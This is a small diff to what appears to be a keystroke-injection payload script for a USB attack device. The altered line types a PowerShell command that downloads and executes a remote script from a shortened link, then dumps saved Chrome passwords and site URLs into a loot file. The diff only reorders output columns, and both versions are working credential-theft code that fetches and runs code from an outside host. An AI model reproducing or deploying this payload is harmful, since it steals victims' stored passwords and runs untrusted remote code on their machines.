@@ -54,7 +54,7 @@ Q ENTER
 Q DELAY 100
 
 # Jackin' Chrome Creds
-Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nea8tb\'\)\; Get-ChromeCreds \| ft Password, UserURL  -AutoSize \| Out-File \$LOOTDIR2\\Chrome.txt -width 250
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nea8tb\'\)\; Get-ChromeCreds \| ft UserURL, Password -AutoSize \| Out-File \$LOOTDIR2\\Chrome.txt -width 250
 Q ENTER
 Q DELAY 100
 
